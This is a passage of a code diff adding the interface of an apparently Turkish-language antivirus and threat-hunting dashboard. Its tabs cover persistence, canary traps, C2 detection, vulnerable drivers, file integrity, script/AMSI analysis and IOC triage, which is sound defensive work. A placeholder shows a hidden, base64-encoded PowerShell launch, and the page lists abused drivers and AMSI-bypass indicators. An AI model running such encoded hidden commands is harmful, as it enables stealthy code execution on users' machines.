+                </div>
+            </div>
+
+            <div class="table-wrap">
+                <table>
+                    <thead>
+                        <tr>
+                            <th>Surucu / Konum</th>
+                            <th>Surucu Turu</th>
+                            <th>Taranan Dosya</th>
+                            <th>Zararli Sayisi</th>
+                            <th>Tehdit Detayi</th>
+                            <th>Durum</th>
+                        </tr>
+                    </thead>
+                    <tbody id="usb-table-body">
+                        <tr><td colspan="6" style="text-align: center; color: var(--text-muted); padding: 30px;">
+                            Suruculeri taramak icin yukaridaki butona basiniz.
+                        </td></tr>
+                    </tbody>
+                </table>
+            </div>
+        </div>
+
+        <!-- TAB 6: PERSISTENCE (AUTORUNS) -->
+        <div id="tab-persistence" class="tab-content">
+            <div class="page-header">
+                <div>
+                    <h1 class="page-title">Windows Baslangic ve Kalicilik (Autoruns)</h1>
+                    <p class="page-desc">Registry Run/RunOnce, Baslangic Klasorleri ve Zamanlanmis Gorevler derin guvenlik analizi.</p>
+                </div>
+                <button class="btn" onclick="loadPersistence()">
+                    <span>&#9881;</span> Kaliciligi Tara
+                </button>
+            </div>
+
+            <div class="table-wrap">
+                <table>
+                    <thead>
+                        <tr>
+                            <th>Konum</th>
+                            <th>Giris Adi</th>
+                            <th>Calisan Komut</th>
+                            <th>Hedef Ikili</th>
+                            <th>Risk Durumu</th>
+                            <th>Tehdit Detayi</th>
+                        </tr>
+                    </thead>
+                    <tbody id="persist-table-body">
+                        <tr><td colspan="6" style="text-align: center; color: var(--text-muted); padding: 30px;">
+                            Kalicilik noktalarini denetlemek icin "Kaliciligi Tara" butonuna basiniz.
+                        </td></tr>
+                    </tbody>
+                </table>
+            </div>
+        </div>
+
+        <!-- TAB 7: CANARY TRAPS -->
+        <div id="tab-canary" class="tab-content">
+            <div class="page-header">
+                <div>
+                    <h1 class="page-title">Fidye Kapani & Yem Dosyalari (Canary Traps)</h1>
+                    <p class="page-desc">0-Gun fidye yazilimlarini ilk sifreleme asamasinda yakalayan tuzak dosyalar.</p>
+                </div>
+                <button class="btn" onclick="loadCanary()">
+                    <span>&#8635;</span> Durumu Kontrol Et
+                </button>
+            </div>
+
+            <div class="card" style="margin-bottom: 24px;">
+                <h3 style="font-size: 14.5px; margin-bottom: 12px; color: #fff;">Stratejik Dizinlere Yem Dosyasi Yerlestir</h3>
+                <div class="form-row">
+                    <input type="text" id="canary-target-dir" value=".\test_samples" placeholder="Yem dosyalarinin yerlestirilecegi dizin">
+                    <button class="btn" onclick="deployCanary()">
+                        <span>&#128038;</span> Yemleri Kur
+                    </button>
+                </div>
+            </div>
+
+            <div class="grid-3">
+                <div class="card">
+                    <div class="stat-label">Toplam Yem Tuzagi</div>
+                    <div class="stat-val" id="canary-total-stat">-</div>
+                </div>
+                <div class="card">
+                    <div class="stat-label">Bozulan / Sifrelenen Yem</div>
+                    <div class="stat-val" id="canary-tampered-stat" style="color: var(--rose);">-</div>
+                </div>
+                <div class="card">
+                    <div class="stat-label">Kapan Durumu</div>
+                    <div class="stat-val" id="canary-status-stat" style="color: var(--emerald);">Guvende</div>
+                </div>
+            </div>
+
+            <div class="table-wrap">
+                <table>
+                    <thead>
+                        <tr>
+                            <th>Yem Dosyasi</th>
+                            <th>Tam Konum</th>
+                            <th>Orijinal SHA256</th>
+                            <th>Kurulum Tarihi</th>
+                            <th>Durum</th>
+                        </tr>
+                    </thead>
+                    <tbody id="canary-table-body">
+                        <tr><td colspan="5" style="text-align: center; color: var(--text-muted); padding: 30px;">
+                            Yem dosyasi durumu yukleniyor...
+                        </td></tr>
+                    </tbody>
+                </table>
+            </div>
+        </div>
+
+        <!-- TAB 8: NETWORK C2 HUNTER -->
+        <div id="tab-network" class="tab-content">
+            <div class="page-header">
+                <div>
+                    <h1 class="page-title">Ag & C2 Arka Kapi Avcisi</h1>
+                    <p class="page-desc">Aktif TCP soketleri, bilinen komuta kontrol portlari ve supheli dis baglantilar.</p>
+                </div>
+                <button class="btn" onclick="loadNetwork()">
+                    <span>&#128376;</span> Agi Tara
+                </button>
+            </div>
+
+            <div class="table-wrap">
+                <table>
+                    <thead>
+                        <tr>
+                            <th>Yerel Adres</th>
+                            <th>Uzak Adres (Hedef)</th>
+                            <th>Baglanti Durumu</th>
+                            <th>Surec Adi</th>
+                            <th>PID</th>
+                            <th>Guvenlik Durumu</th>
+                        </tr>
+                    </thead>
+                    <tbody id="network-table-body">
+                        <tr><td colspan="6" style="text-align: center; color: var(--text-muted); padding: 30px;">
+                            Ag soketlerini denetlemek icin "Agi Tara" butonuna basiniz.
+                        </td></tr>
+                    </tbody>
+                </table>
+            </div>
+        </div>
+
+        <!-- TAB 9: QUARANTINE -->
+        <div id="tab-quarantine" class="tab-content">
+            <div class="page-header">
+                <div>
+                    <h1 class="page-title">Karantina Kasasi (Vault)</h1>
+                    <p class="page-desc">Izole edilen ve guvenli XOR maskelemesiyle calistirilamaz kilinan dosyalar.</p>
+                </div>
+                <button class="btn btn-secondary" onclick="loadQuarantine()">
+                    <span>&#8635;</span> Yenile
+                </button>
+            </div>
+
+            <div class="table-wrap">
+                <table>
+                    <thead>
+                        <tr>
+                            <th>Karantina ID</th>
+                            <th>Tehdit Adi</th>
+                            <th>Motor</th>
+                            <th>Orijinal Yol</th>
+                            <th>Boyut</th>
+                            <th>Tarih</th>
+                            <th>Islemler</th>
+                        </tr>
+                    </thead>
+                    <tbody id="quar-table-body">
+                        <!-- JS ile doldurulur -->
+                    </tbody>
+                </table>
+            </div>
+        </div>
+
+        <!-- TAB 10: FEEDS -->
+        <div id="tab-feeds" class="tab-content">
+            <div class="page-header">
+                <div>
+                    <h1 class="page-title">Acik Kaynak Tehdit Istihbarati</h1>
+                    <p class="page-desc">Topluluk veritabanlari, gunluk zararli hash listeleri ve YARA kurallari.</p>
+                </div>
+                <div style="display:flex; gap:10px; flex-wrap: wrap;">
+                    <button class="btn" onclick="triggerUpdate()">
+                        <span>&#8635;</span> Tehdit Beslemelerini Güncelle
+                    </button>
+                    <button class="btn btn-secondary" onclick="syncYaraCommunityRules()" style="border-color: rgba(6,182,212,0.4); color: var(--cyan);">
+                        <span>&#128220;</span> Topluluk YARA Kurallarını Senkronize Et
+                    </button>
+                </div>
+            </div>
+
+            <div class="card" style="margin-bottom: 20px;">
+                <h3 style="margin-bottom: 12px; color: #fff;">Beslenen Acik Kaynak Kanallar</h3>
+                <ul style="list-style: none; display: flex; flex-direction: column; gap: 14px; font-size: 13px;">
+                    <li style="display: flex; justify-content: space-between; border-bottom: 1px solid var(--border); padding-bottom: 10px;">
+                        <span><strong>MalwareBazaar (Abuse.ch):</strong> Gunluk en son yuklenen zararli yazilim SHA256/MD5 akisi</span>
+                        <span class="badge-status">Bagli (CSV / API)</span>
+                    </li>
+                    <li style="display: flex; justify-content: space-between; border-bottom: 1px solid var(--border); padding-bottom: 10px;">
+                        <span><strong>ThreatFox (Abuse.ch):</strong> Gercek zamanli IOC, C2 ve payload hash veritabani</span>
+                        <span class="badge-status">Bagli (CSV / API)</span>
+                    </li>
+                    <li style="display: flex; justify-content: space-between; border-bottom: 1px solid var(--border); padding-bottom: 10px;">
+                        <span><strong>Feodo Tracker (Abuse.ch):</strong> Aktif botnet C2 IP adresleri ve ağ kural seti</span>
+                        <span class="badge-status">Canlı Akış</span>
+                    </li>
+                    <li style="display: flex; justify-content: space-between; border-bottom: 1px solid var(--border); padding-bottom: 10px;">
+                        <span><strong>YARA-Forge & Community Rulesets:</strong> Cobalt Strike, Fidye Yazılımları, Mimikatz ve Bilgi Çalıcılar</span>
+                        <span class="badge-status" style="color: var(--cyan);">Doğrulanmış (YARA-X)</span>
+                    </li>
+                    <li style="display: flex; justify-content: space-between; padding-bottom: 10px;">
+                        <span><strong>ClamAV Open CVD:</strong> ClamAV virus hash imzasi (.hdb) ve yerel clamd entegrasyonu</span>
+                        <span class="badge-status">Entegre</span>
+                    </li>
+                </ul>
+            </div>
+        </div>
+
+        <!-- TAB 12: DRIVERS / BYOVD -->
+        <div id="tab-drivers" class="tab-content">
+            <div class="page-header">
+                <div>
+                    <h1 class="page-title">BYOVD ve Savunmasız Çekirdek Sürücü Avcısı</h1>
+                    <p class="page-desc">LOLDrivers.io açık istihbaratı ile kernel düzeyinde EDR/AV kapatmaya çalışan zafiyetli sürücüleri (gdrv.sys, mhyprot2.sys vb.) ve hazırlık alanlarını tespit edin.</p>
+                </div>
+                <button class="btn" onclick="loadDrivers()">
+                    <span>&#8635;</span> Sürücüleri Şimdi Tara
+                </button>
+            </div>
+
+            <div class="grid-3" style="margin-bottom: 20px;">
+                <div class="card">
+                    <div class="stat-label">Sürücü Zafiyet Listesi (LOLDrivers) <span>&#128737;</span></div>
+                    <div class="stat-val" style="color: var(--cyan);">16+ Kural</div>
+                    <div class="stat-desc">Küratörlü CVE ve Ring0 istismar imzaları</div>
+                </div>
+                <div class="card">
+                    <div class="stat-label">Doğrulanmış Hash İmzaları <span>&#128273;</span></div>
+                    <div class="stat-val" style="color: var(--amber);">SHA-256 DB</div>
+                    <div class="stat-desc">LOLDrivers.io doğrulanmış kötücül sürücüler</div>
+                </div>
+                <div class="card">
+                    <div class="stat-label">Tarama Durumu <span>&#128680;</span></div>
+                    <div class="stat-val" id="stat-drivers-count" style="color: var(--emerald);">Temiz</div>
+                    <div class="stat-desc" id="stat-drivers-desc">Son tarama hazır</div>
+                </div>
+            </div>
+
+            <div class="card">
+                <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 16px;">
+                    <h3 style="color: #fff; font-size: 15px;">Tespit Edilen Çekirdek Sürücü Tehditleri</h3>
+                    <span style="font-size: 11px; color: var(--text-muted);">Taranan Konumlar: C:\Windows\System32\drivers, %TEMP%, %APPDATA%, Public</span>
+                </div>
+                <div class="table-container">
+                    <table>
+                        <thead>
+                            <tr>
+                                <th>Sürücü Dosyası</th>
+                                <th>Risk Seviyesi</th>
+                                <th>CVE / Kural</th>
+                                <th>Konum / Hazırlık</th>
+                                <th>SHA-256 Özeti</th>
+                                <th>Tehdit Detayı</th>
+                            </tr>
+                        </thead>
+                        <tbody id="drivers-table-body">
+                            <tr>
+                                <td colspan="6" style="text-align: center; color: var(--text-muted); padding: 30px;">
+                                    Henüz tarama başlatılmadı. "Sürücüleri Şimdi Tara" düğmesine basarak denetleyin.
+                                </td>
+                            </tr>
+                        </tbody>
+                    </table>
+                </div>
+            </div>
+        </div>
+
+        <!-- TAB 13: FIM (FILE INTEGRITY MONITORING) -->
+        <div id="tab-fim" class="tab-content">
+            <div class="page-header">
+                <div>
+                    <h1 class="page-title">FIM - Dosya ve Sistem Bütünlüğü Denetimi</h1>
+                    <p class="page-desc">Kritik sistem dosyaları (hosts, cmd, powershell, dnsapi) ve YARA kurallarının yetkisiz değiştirilmesini (Tampering) SHA-256 kriptografik referans ile anında saptayın.</p>
+                </div>
+                <div style="display: flex; gap: 10px;">
+                    <button class="btn-secondary" onclick="initFim()" style="padding: 10px 18px; border-radius: 9px; font-weight: 600;">
+                        <span>&#128190;</span> Referans (Baseline) Oluştur
+                    </button>
+                    <button class="btn" onclick="checkFim()">
+                        <span>&#128269;</span> Bütünlüğü Şimdi Denetle
+                    </button>
+                </div>
+            </div>
+
+            <div class="grid-3" style="margin-bottom: 20px;">
+                <div class="card">
+                    <div class="stat-label">İzlenen Kritik Dosyalar <span>&#128196;</span></div>
+                    <div class="stat-val" id="stat-fim-monitored" style="color: var(--cyan);">-</div>
+                    <div class="stat-desc">hosts, shell ikilileri ve ağ kütüphaneleri</div>
+                </div>
+                <div class="card">
+                    <div class="stat-label">Bütünlük Durumu <span>&#128737;</span></div>
+                    <div class="stat-val" id="stat-fim-integrity" style="color: var(--emerald);">Bütünlük Sağlam</div>
+                    <div class="stat-desc" id="stat-fim-integrity-desc">Kriptografik eşleşme tam</div>
+                </div>
+                <div class="card">
+                    <div class="stat-label">Tampering / Değişiklik İhlali <span>&#9888;</span></div>
+                    <div class="stat-val" id="stat-fim-tampered" style="color: var(--emerald);">0 İhlal</div>
+                    <div class="stat-desc">Yetkisiz modifikasyon tespit edilmedi</div>
+                </div>
+            </div>
+
+            <div class="card">
+                <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 16px;">
+                    <h3 style="color: #fff; font-size: 15px;">Kritik Sistem Dosyası Kriptografik Bütünlük Raporu</h3>
+                    <span style="font-size: 11px; color: var(--text-muted);">Referans Verisi: .project_guard/fim_baseline.json</span>
+                </div>
+                <div class="table-container">
+                    <table>
+                        <thead>
+                            <tr>
+                                <th>Hedef Dosya</th>
+                                <th>Açıklama / Rol</th>
+                                <th>Durum</th>
+                                <th>Şiddet</th>
+                                <th>Mevcut SHA-256</th>
+                                <th>Referans SHA-256</th>
+                            </tr>
+                        </thead>
+                        <tbody id="fim-table-body">
+                            <tr>
+                                <td colspan="6" style="text-align: center; color: var(--text-muted); padding: 30px;">
+                                    Durum kontrolü için "Bütünlüğü Şimdi Denetle" düğmesine tıklayın.
+                                </td>
+                            </tr>
+                        </tbody>
+                    </table>
+                </div>
+            </div>
+        </div>
+
+        <!-- TAB 14: SCRIPT & AMSI HUNTER -->
+        <div id="tab-scripts" class="tab-content">
+            <div class="page-header">
+                <div>
+                    <h1 class="page-title">Zararlı Komut Dosyası & AMSI Avcısı</h1>
+                    <p class="page-desc">PowerShell, VBScript, Batch betiklerini ve AMSI atlatma (Bypass) girişimlerini analiz edin. Gizli Base64 yüklerini tek tıkla çözün.</p>
+                </div>
+            </div>
+
+            <div class="card" style="margin-bottom: 24px;">
+                <h3 style="color: #fff; font-size: 15px; margin-bottom: 12px;">Betik Kodunu veya Dosya Yolunu Girin</h3>
+                <div class="form-row" style="margin-bottom: 12px;">
+                    <input type="text" id="script-file-path" placeholder="İsteğe bağlı betik dosya yolu (Örn: C:\test\malware.ps1 veya sample.vbs)">
+                    <button class="btn-secondary" onclick="loadScriptFileContent()" style="padding: 11px 18px; border-radius: 9px;">
+                        <span>&#128194;</span> Dosyayı Yükle
+                    </button>
+                </div>
+                <textarea id="script-code-input" rows="8" style="width: 100%; background: rgba(15, 23, 42, 0.8); border: 1px solid var(--border); border-radius: 9px; padding: 12px 16px; color: #fff; font-family: monospace; font-size: 12.5px; outline: none; margin-bottom: 14px; resize: vertical;" placeholder="PowerShell / VBScript / Batch kodunu buraya yapıştırın... (Örn: powershell.exe -w hidden -enc SQBFAFgAIAA...)"></textarea>
+                <div style="display: flex; justify-content: flex-end; gap: 10px;">
+                    <button class="btn-secondary" onclick="loadSampleScript()" style="padding: 11px 18px; border-radius: 9px;">
+                        <span>&#129514;</span> Örnek AMSI Kodu Doldur
+                    </button>
+                    <button class="btn" onclick="analyzeScriptLive()">
+                        <span>&#9889;</span> Betiği Derinlemesine Analiz Et
+                    </button>
+                </div>
+            </div>
+
+            <div id="script-result-container" style="display: none;">
+                <div class="grid-3" style="margin-bottom: 20px;">
+                    <div class="card">
+                        <div class="stat-label">Tehdit Teşhisi <span>&#128737;</span></div>
+                        <div class="stat-val" id="stat-script-threat" style="color: var(--rose); font-size: 18px;">-</div>
+                        <div class="stat-desc" id="stat-script-type">Script Türü: -</div>
+                    </div>
+                    <div class="card">
+                        <div class="stat-label">Risk & Şiddet Seviyesi <span>&#9888;</span></div>
+                        <div class="stat-val" id="stat-script-sev" style="color: var(--rose);">-</div>
+                        <div class="stat-desc" id="stat-script-mitre">MITRE: -</div>
+                    </div>
+                    <div class="card">
+                        <div class="stat-label">Bulunan Göstergeler <span>&#128065;</span></div>
+                        <div class="stat-val" id="stat-script-indicators-count" style="color: var(--amber);">-</div>
+                        <div class="stat-desc">Zararlı patern sayısı</div>
+                    </div>
+                </div>
+
+                <div class="card" style="margin-bottom: 20px;" id="script-deob-card">
+                    <h3 style="color: var(--emerald); font-size: 14px; margin-bottom: 8px;">&#128275; Çözülmüş Gizli Yük (De-obfuscated Payload)</h3>
+                    <pre id="script-deob-text" style="background: rgba(0, 0, 0, 0.4); border: 1px solid rgba(16, 185, 129, 0.3); border-radius: 8px; padding: 14px; font-size: 12px; color: var(--emerald); overflow-x: auto; white-space: pre-wrap; word-break: break-all;"></pre>
+                </div>
+
+                <div class="card">
+                    <h3 style="color: #fff; font-size: 14px; margin-bottom: 12px;">Tespit Edilen Şüpheli Göstergeler ve Saldırı Teknikleri</h3>
+                    <ul id="script-indicators-list" style="list-style: none; display: flex; flex-direction: column; gap: 8px; font-size: 13px;"></ul>
+                </div>
+            </div>
+        </div>
+
+        <!-- TAB 15: STATIC IOC TRIAJER -->
+        <div id="tab-iocs" class="tab-content">
+            <div class="page-header">
+                <div>
+                    <h1 class="page-title">Statik IOC ve Dize (String) Triyaj Motoru</h1>
+                    <p class="page-desc">PE/DLL ikililerinden, betiklerden ve bellek dökümlerinden gizli ASCII/UTF-16 dizeleri, genel IP'leri, URL'leri ve kripto cüzdanlarını ayıklayın. Feodo Tracker C2 botnet eşleşmelerini anında görün.</p>
+                </div>
+            </div>
+
+            <div class="card" style="margin-bottom: 24px;">
+                <h3 style="color: #fff; font-size: 15px; margin-bottom: 12px;">Hedef Dosya Yolu veya Analiz Edilecek Dize Metni</h3>
+                <div class="form-row">
+                    <input type="text" id="ioc-target-input" placeholder="Dosya yolu veya metin girin (Örn: .\test_samples\suspect.exe veya IP/URL içeren metin)">
+                    <button class="btn" onclick="extractIocsLive()">
+                        <span>&#128269;</span> IOC'leri ve Dizeleri Ayıkla
+                    </button>
+                </div>
+            </div>
+
+            <div id="ioc-result-container" style="display: none;">
+                <div class="grid-4" style="margin-bottom: 20px;">
+                    <div class="card">
+                        <div class="stat-label">Ayıklanan Toplam Dize <span>&#128196;</span></div>
+                        <div class="stat-val" id="stat-ioc-total" style="color: var(--cyan);">-</div>
+                        <div class="stat-desc">ASCII & UTF-16LE dize havuzu</div>
+                    </div>
+                    <div class="card">
+                        <div class="stat-label">C2 Botnet Eşleşmesi <span>&#127760;</span></div>
+                        <div class="stat-val" id="stat-ioc-c2" style="color: var(--rose);">-</div>
+                        <div class="stat-desc">Feodo Tracker doğrulanmış C2</div>
+                    </div>
+                    <div class="card">
+                        <div class="stat-label">Genel (Public) IP'ler <span>&#128205;</span></div>
+                        <div class="stat-val" id="stat-ioc-ips" style="color: var(--amber);">-</div>
+                        <div class="stat-desc">Dış ağ bağlantı hedefleri</div>
+                    </div>
+                    <div class="card">
+                        <div class="stat-label">URL & Kripto Cüzdan <span>&#128273;</span></div>
+                        <div class="stat-val" id="stat-ioc-urls-wallets" style="color: var(--emerald);">-</div>
+                        <div class="stat-desc">Web linkleri ve BTC/XMR cüzdanı</div>
+                    </div>
+                </div>
+
+                <!-- C2 Table -->
+                <div class="card" style="margin-bottom: 20px;" id="ioc-c2-card">
+                    <h3 style="color: var(--rose); font-size: 15px; margin-bottom: 12px;">&#9888; Doğrulanmış C2 Botnet Eşleşmeleri</h3>
+                    <div class="table-container">
+                        <table>
+                            <thead>
+                                <tr>
+                                    <th>C2 IP Adresi</th>
+                                    <th>Tehdit Türü</th>
+                                    <th>Zararlı Yazılım Ailesi (Malware)</th>
+                                    <th>Kaynak</th>
+                                </tr>
+                            </thead>
+                            <tbody id="ioc-c2-table-body"></tbody>
+                        </table>
+                    </div>
+                </div>
+
+                <!-- URLs & IPs Grid -->
+                <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 16px; margin-bottom: 20px;">
+                    <div class="card">
+                        <h3 style="color: #fff; font-size: 14px; margin-bottom: 10px;">Tespit Edilen Genel IP Adresleri</h3>
+                        <div id="ioc-ips-list" style="max-height: 220px; overflow-y: auto; font-family: monospace; font-size: 12px; display: flex; flex-direction: column; gap: 6px;"></div>
+                    </div>
+                    <div class="card">
+                        <h3 style="color: #fff; font-size: 14px; margin-bottom: 10px;">Tespit Edilen URL ve Alan Adları</h3>
+                        <div id="ioc-urls-list" style="max-height: 220px; overflow-y: auto; font-family: monospace; font-size: 12px; display: flex; flex-direction: column; gap: 6px;"></div>
+                    </div>
+                </div>
+
+                <!-- Wallets & Keywords -->
+                <div class="card">
+                    <h3 style="color: #fff; font-size: 14px; margin-bottom: 10px;">Kripto Para Cüzdanları ve Şüpheli Anahtar Kelimeler</h3>
+                    <div id="ioc-wallets-keywords" style="font-size: 12.5px; display: flex; flex-wrap: wrap; gap: 8px;"></div>
+                </div>
+            </div>
+        </div>
+
+        <!-- TAB 16: WINDOWS EVENT LOG HUNTER -->
+        <div id="tab-eventlog" class="tab-content">
+            <div class="page-header">
+                <div>
+                    <h1 class="page-title">&#128450; Windows Olay Günlüğü Tehdit Avcısı (EventLog Hunter)</h1>
+                    <p class="page-desc">PowerShell ScriptBlock (4104), Windows Defender Tehdit Günlükleri (1116/1117) ve Günlük Silme (1102) denetimi.</p>
+                </div>
+                <button class="btn" onclick="loadEventLogs(true)" id="btn-refresh-eventlogs">
+                    <span>&#8635;</span> Olay Günlüklerini Tara
+                </button>
+            </div>
+
+            <div class="grid-4" style="margin-bottom: 20px;">
+                <div class="card">
+                    <div class="stat-label">İncelenen Olay Kaydı <span>&#128196;</span></div>
+                    <div class="stat-val" id="stat-evlog-total">-</div>
+                    <div class="stat-desc">Toplam kayıt sayısı</div>
+                </div>
+                <div class="card">
+                    <div class="stat-label">Şüpheli / Zararlı Olaylar <span>&#9888;</span></div>
+                    <div class="stat-val" id="stat-evlog-susp" style="color: var(--rose);">-</div>
+                    <div class="stat-desc">AMSI bypass, cradle, silinme</div>
+                </div>
+                <div class="card">
+                    <div class="stat-label">PowerShell ScriptBlock <span>&#128220;</span></div>
+                    <div class="stat-val" id="stat-evlog-ps" style="color: var(--cyan);">-</div>
+                    <div class="stat-desc">Event ID 4104 (In-Memory)</div>
+                </div>
+                <div class="card">
+                    <div class="stat-label">Defender Olayları <span>&#128737;</span></div>
+                    <div class="stat-val" id="stat-evlog-def" style="color: var(--emerald);">-</div>
+                    <div class="stat-desc">Event ID 1116 & 1117</div>
+                </div>
+            </div>
+
+            <div class="card" style="margin-bottom: 20px;">
+                <div style="display: flex; justify-content: space-between; align-items: center; flex-wrap: wrap; gap: 10px; margin-bottom: 14px;">
+                    <h3 style="color: #fff; font-size: 15px;">Canlı Olay Günlüğü Akışı ve Analiz</h3>
+                    <div style="display: flex; gap: 8px;">
+                        <button class="btn-secondary" onclick="filterEventLogTab('all')">Tümü</button>
+                        <button class="btn-secondary" style="color: var(--rose); border-color: rgba(244,63,94,0.4);" onclick="filterEventLogTab('threats')">Yalnızca Tehditler</button>
+                        <button class="btn-secondary" style="color: var(--cyan);" onclick="filterEventLogTab('ps')">PowerShell (4104)</button>
+                        <button class="btn-secondary" style="color: var(--emerald);" onclick="filterEventLogTab('def')">Defender (1116/1117)</button>
+                        <button class="btn-secondary" style="color: var(--amber);" onclick="filterEventLogTab('sec')">Güvenlik (1102)</button>
+                    </div>
+                </div>
+
+                <div class="table-container">
+                    <table>
+                        <thead>
+                            <tr>
+                                <th>Olay ID</th>
+                                <th>Zaman</th>
+                                <th>Kaynak Günlük</th>
+                                <th>Önem Seviyesi</th>
+                                <th>Tehdit / Ayrinti</th>
+                                <th>İçerik Önizleme</th>
+                            </tr>
+                        </thead>
+                        <tbody id="evlog-table-body">
+                            <tr>
+                                <td colspan="6" style="text-align: center; color: var(--text-muted); padding: 30px;">
+                                    Olay günlüklerini yüklemek için yukarıdaki "Olay Günlüklerini Tara" butonuna tıklayın.
+                                </td>
+                            </tr>
+                        </tbody>
+                    </table>
+                </div>
+            </div>
+        </div>
+
+        <!-- TAB 17: PE DEEP TRIAGE & ENTROPY MATRIX -->
+        <div id="tab-triage" class="tab-content">
+            <div class="page-header">
+                <div>
+                    <h1 class="page-title">&#128300; Derin PE Statik Triyajı & Entropi Matrisi</h1>
+                    <p class="page-desc">PE ikili analizi, bölüm bazlı Shannon entropisi (0-8.00), W^X ihlalleri ve Capa/ATT&CK yetenek matrisi.</p>
+                </div>
+            </div>
+
+            <div class="card" style="margin-bottom: 24px;">
+                <div style="display: flex; gap: 12px; align-items: center; flex-wrap: wrap;">
+                    <div style="flex: 1; min-width: 280px;">
+                        <input type="text" id="triage-path-input" placeholder="Analiz edilecek PE dosya yolu (Örn: C:\Windows\System32\cmd.exe)..." style="width: 100%; padding: 11px 16px; border-radius: 9px; background: rgba(0,0,0,0.4); border: 1px solid var(--border); color: #fff; font-family: monospace; font-size: 13px;">
+                    </div>
+                    <button class="btn" onclick="triagePeLive()" id="btn-triage-run">
+                        <span>&#128300;</span> Derin Triyaj Başlat
+                    </button>
+                </div>
+                <div style="margin-top: 10px; display: flex; gap: 8px; flex-wrap: wrap; align-items: center;">
+                    <span style="font-size: 12px; color: var(--text-muted);">Hızlı Örnekler:</span>
+                    <button class="btn-secondary" style="font-size: 11px; padding: 4px 10px;" onclick="document.getElementById('triage-path-input').value = 'C:\\Windows\\System32\\cmd.exe'; triagePeLive();">cmd.exe</button>
+                    <button class="btn-secondary" style="font-size: 11px; padding: 4px 10px;" onclick="document.getElementById('triage-path-input').value = 'C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe'; triagePeLive();">powershell.exe</button>
+                    <button class="btn-secondary" style="font-size: 11px; padding: 4px 10px;" onclick="document.getElementById('triage-path-input').value = 'C:\\Windows\\System32\\calc.exe'; triagePeLive();">calc.exe</button>
+                </div>
+            </div>
+
+            <div id="triage-result-container" style="display: none;">
+                <!-- Header Stats -->
+                <div class="grid-4" style="margin-bottom: 20px;">
+                    <div class="card">
+                        <div class="stat-label">Tehdit Riski Skoru <span>&#127919;</span></div>
+                        <div class="stat-val" id="triage-threat-score" style="color: var(--rose);">-</div>
+                        <div class="stat-desc" id="triage-verdict">Otomatik Karar</div>
+                    </div>
+                    <div class="card">
+                        <div class="stat-label">Genel Shannon Entropisi <span>&#128202;</span></div>
+                        <div class="stat-val" id="triage-entropy-val" style="color: var(--amber);">-</div>
+                        <div class="stat-desc">Maksimum: 8.00 bit/bayt</div>
+                    </div>
+                    <div class="card">
+                        <div class="stat-label">PE Mimarisi & Giriş <span>&#9881;</span></div>
+                        <div class="stat-val" id="triage-arch" style="color: var(--cyan); font-size: 19px;">-</div>
+                        <div class="stat-desc" id="triage-entrypoint">Entry Point: -</div>
+                    </div>
+                    <div class="card">
+                        <div class="stat-label">Tespit Edilen ATT&CK <span>&#128737;</span></div>
+                        <div class="stat-val" id="triage-caps-count" style="color: var(--emerald);">-</div>
+                        <div class="stat-desc">Capa / MITRE yetenekleri</div>
+                    </div>
+                </div>
+
+                <!-- Sections Entropy Table -->
+                <div class="card" style="margin-bottom: 20px;">
+                    <h3 style="color: #fff; font-size: 15px; margin-bottom: 12px;">PE Bölüm Tablosu ve Entropi Isı Haritası</h3>
+                    <div class="table-container">
+                        <table>
+                            <thead>
+                                <tr>
+                                    <th>Bölüm Adı</th>
+                                    <th>Sanal Boyut</th>
+                                    <th>Ham Boyut</th>
+                                    <th>Shannon Entropisi</th>
+                                    <th>İzinler</th>
+                                    <th>Durum / Değerlendirme</th>
+                                </tr>
+                            </thead>
+                            <tbody id="triage-sections-body"></tbody>
+                        </table>
+                    </div>
+                </div>
+
+                <!-- MITRE Capabilities Grid -->
+                <div class="card" style="margin-bottom: 20px;">
+                    <h3 style="color: #fff; font-size: 15px; margin-bottom: 12px;">Tespit Edilen MITRE ATT&CK & Capa Yetenekleri</h3>
+                    <div id="triage-capabilities-grid" style="display: grid; grid-template-columns: repeat(auto-fill, minmax(320px, 1fr)); gap: 14px;"></div>
+                </div>
+
+                <!-- Analyst Notes -->
+                <div class="card">
+                    <h3 style="color: var(--cyan); font-size: 15px; margin-bottom: 10px;">Güvenlik Analisti Bulguları ve Notlar</h3>
+                    <ul id="triage-notes-list" style="margin-left: 20px; color: var(--text-muted); font-size: 13px; display: flex; flex-direction: column; gap: 6px;"></ul>
+                </div>
+            </div>
+        </div>
+
+    </main>
+
+    <div id="toast"></div>
+
+    <script>
+        function showToast(msg) {
+            const t = document.getElementById('toast');
+            t.innerText = msg;
+            t.style.display = 'block';
+            setTimeout(() => { t.style.display = 'none'; }, 3500);
+        }
+
+        const tabsList = [
+            'tab-overview',
+            'tab-scanner',
+            'tab-processes',
+            'tab-memory',
+            'tab-lolbas',
+            'tab-usb',
+            'tab-persistence',
+            'tab-canary',
+            'tab-network',
+            'tab-quarantine',
+            'tab-feeds',
+            'tab-drivers',
+            'tab-fim',
+            'tab-scripts',
+            'tab-iocs',
+            'tab-eventlog',
+            'tab-triage'
+        ];
+
+        function switchTab(tabId) {
+            document.querySelectorAll('.tab-content').forEach(el => el.classList.remove('active'));
+            document.querySelectorAll('.nav-item').forEach(el => el.classList.remove('active'));
+            
+            const targetEl = document.getElementById(tabId);
+            if (targetEl) targetEl.classList.add('active');
+
+            const index = tabsList.indexOf(tabId);
+            if (index >= 0) {
+                document.querySelectorAll('.nav-item')[index].classList.add('active');
+            }
+
+            if (tabId === 'tab-overview') loadStatus();
+            if (tabId === 'tab-quarantine') loadQuarantine();
+            if (tabId === 'tab-canary') loadCanary();
+            if (tabId === 'tab-persistence') loadPersistence();
+            if (tabId === 'tab-network') loadNetwork();
+            if (tabId === 'tab-memory') loadMemory();
+            if (tabId === 'tab-lolbas') loadLolbas();
+            if (tabId === 'tab-usb') loadUsb();
+            if (tabId === 'tab-drivers') loadDrivers();
+            if (tabId === 'tab-fim') checkFimStatus();
+            if (tabId === 'tab-eventlog') loadEventLogs();
+        }
+
+        async function loadStatus() {
+            try {
+                const res = await fetch('/api/status');
+                const data = await res.json();
+                document.getElementById('stat-total-sigs').innerText = data.total_signatures.toLocaleString();
+                document.getElementById('stat-quar-count').innerText = data.quarantine_count;
+                if (document.getElementById('stat-c2-count')) {
+                    document.getElementById('stat-c2-count').innerText = (data.c2_iocs_count || 0).toLocaleString();
+                }
+
+                loadDefenderInfo();
+                loadServiceStatus();
+
